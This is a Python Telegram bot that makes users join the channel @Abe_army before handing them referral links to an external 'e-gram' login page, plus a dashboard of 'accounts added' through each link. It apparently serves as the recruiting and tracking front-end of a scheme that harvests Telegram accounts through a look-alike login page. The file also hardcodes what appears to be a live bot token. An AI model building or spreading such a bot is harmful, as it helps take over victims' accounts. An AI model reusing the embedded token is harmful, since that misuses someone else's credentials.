#!/usr/bin/env python3
"""
Telegram bot with channel join requirement.
Hardcoded credentials (INSECURE – use env vars in production).
"""

import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ChatMemberStatus

# ========== HARDCODED CONFIGURATION (REPLACE WITH YOUR VALUES) ==========
BOT_TOKEN = "8210146562:AAHvM54C4KvHsf-YfAjOC9VLe6o1l-gEtBM"   # ⚠️ Exposed – revoke and replace
WEBAPP_URL = "https://e-gram-98zv.onrender.com"                 # Your Flask app URL
REQUIRED_CHANNEL = "@Abe_army"                                   # Channel to join
# =========================================================================

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

async def is_member(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Check if user has joined the required channel."""
    try:
        chat_member = await context.bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
        return chat_member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]
    except Exception as e:
        logger.error(f"Error checking membership: {e}")
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command – require channel join."""
    user_id = update.effective_user.id
    user = update.effective_user
    logger.info(f"User {user_id} (@{user.username}) started the bot.")

    # Check membership
    if not await is_member(user_id, context):
        # User not in channel – ask to join
        channel_link = "https://t.me/Abe_army"  # Direct link
        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=channel_link)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"⚠️ **You must join our channel first!**\n\n"
            f"Please join {REQUIRED_CHANNEL} and then click /start again.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return

    # User is a member – give invite link
    invite_link = f"{WEBAPP_URL}/login?inviter={user_id}"
    keyboard = [[InlineKeyboardButton("➕ Add Account", url=invite_link)]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"🔗 **Your invite link:**\n{invite_link}\n\n"
        "Share this link with others. When they add an account via this link, "
        "you'll see it in your private dashboard.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dashboard command – require channel join."""
    user_id = update.effective_user.id
    user = update.effective_user
    logger.info(f"User {user_id} (@{user.username}) requested dashboard.")

    # Check membership
    if not await is_member(user_id, context):
        channel_link = "https://t.me/Abe_army"
        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=channel_link)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"⚠️ **You must join our channel first!**\n\n"
            f"Please join {REQUIRED_CHANNEL} and then click /dashboard again.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return

    # User is a member – give dashboard link
    dash_link = f"{WEBAPP_URL}/user-dashboard?inviter={user_id}"
    await update.message.reply_text(
        f"📊 **Your private dashboard:**\n{dash_link}\n\n"
        "Here you can see all accounts added via your invite links.",
        parse_mode="Markdown"
    )

def main():
    """Start the bot."""
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()

    # Register handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("dashboard", dashboard))

    # Start polling
    logger.info("Bot started. Press Ctrl+C to stop.")
    app.run_polling()

if __name__ == "__main__":
    main()
